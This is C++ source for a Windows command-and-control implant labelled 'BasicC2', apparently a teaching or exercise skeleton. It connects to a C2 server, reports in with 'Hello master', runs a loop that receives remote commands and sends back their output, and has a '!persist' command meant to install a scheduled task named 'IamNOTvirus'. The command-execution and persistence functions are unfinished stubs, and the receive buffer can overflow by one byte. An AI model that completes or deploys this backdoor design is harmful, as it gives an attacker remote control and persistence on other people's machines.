#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>

using namespace std;

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

// Init socket connection with server.
SOCKET initSocket(string serverAddr, string port)
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    int iResult;

    struct addrinfo* result = NULL, * ptr = NULL, hints;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        cout << "[!] WSAStartup failed with error: " << iResult << endl;
        return 1;
    }

    // Initialize Winsock
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(serverAddr.c_str(), port.c_str(), &hints, &result);
    if (iResult != 0) {
        cout << "[!] getaddrinfo failed with error: " << iResult << endl;
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            cout << "[!] socket failed with error: " << WSAGetLastError() << endl;
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    return ConnectSocket;
}

// Sending message to server.
int sendMsg(SOCKET ConnectSocket, string msg)
{
    int iResult;

    iResult = send(ConnectSocket, msg.c_str(), msg.length(), 0);
    if (iResult == SOCKET_ERROR) {
        cout << "[!] connection read error: " << WSAGetLastError() << endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    return iResult;
}

// Blocking function waiting for message from server.
string getMsg(SOCKET ConnectSocket)
{
    string out;

    char recvbuf[1024];
    int iResult;
    int recvbuflen = 1024;

    iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);

    if (iResult > 0)
    {
        // terminate string
        recvbuf[iResult] = '\0';
        out = string(recvbuf).substr(0, iResult);
    }
    else
    {
        out = "-FAIL-";
    }

    return out;
}


// Execute command in cmd.exe in parameter and return command output.
string exec(string cmdStr) {
    string result = "";
    const char* cmd;

    // forward all error output to standart output
    cmdStr = cmdStr + " 2>&";
    cmd = cmdStr.c_str();

    // TBD: implement execution via cmd.exe 
    result = "EXECUTION IS NOT IMPLEMENTED YET";

    return result;
}

// Get system path of actually running exe.
string getActualExePath()
{
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return string(buffer);
}

// Check whether persistence is needed. If so, create it.
string persistance()
{
    string cmdOut;
    string cmd;
    string exeFileLocation = getActualExePath();
    string serviceName = "IamNOTvirus";


    // firstly check whether this service is not created already
    cmd = "schtasks /query 2>&1";
    cmdOut = exec(cmd);
    // check, whether in the list of created  tasks there is our service listed
    if (cmdOut.find(serviceName) == std::string::npos)
    {
        exeFileLocation = getActualExePath();

        // TBD: create cmd persistence with using variables "exeFileLocation" and serviceName
        string cmd = "echo PERSISTENCE NOT IMPLEMENTED YET";
        cmdOut = exec(cmd);
    }
    else
    {
        cmdOut = "No need to create new task, scheduled task with name " + serviceName + " is already created.";
    }

    return cmdOut;
}


int __cdecl main(int argc, char** argv)
{
    int iResult;
    string cmd;
    string cmdOut;
    SOCKET ConnectSocket;

    string serverAddr = "localhost";
    string serverPort = "8080";
    string prompt = "\n> ";

    cout << "[i] BasicC2 started" << endl;

    cout << "[i] trying to contact C2 server " << serverAddr << ":" << serverPort << endl;
    ConnectSocket = initSocket(serverAddr, serverPort);

    if (ConnectSocket == 1)
    {
        cout << "[!] unable to connect to C2 server, quitting" << endl;
        return 1;
    }

    cout << "[i] sending initial message to C2 server" << endl;
    // Send an initial message
    sendMsg(ConnectSocket, "\nHello master, I am your BasicC2."+prompt);
    cout << "[i] waiting for commands from server" << endl;

    // main functional loop:
    while (true)
    {
        cmd = getMsg(ConnectSocket);
        cout << "[i] recieved command from server: " << cmd;

        if (cmd == "-FAIL-")
        {
            cout << "[!] connection not valid anymore, time to quit" << endl;
            break;
        }
        else if (cmd.find("!persist") != std::string::npos)
        {
            cout << "[i] trying to get persistance via schedule tasks" << endl;
            cmdOut = persistance();
            sendMsg(ConnectSocket, "I tried to make myself persistent, here is the output:\n" + cmdOut + prompt);
        }
        else
        {
            cmdOut = exec(cmd);
            sendMsg(ConnectSocket, cmdOut + prompt);
            cout << "[i] sending command output to server" << endl;
        }
    }

    cout << "[i] cleanup and quit" << endl;

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}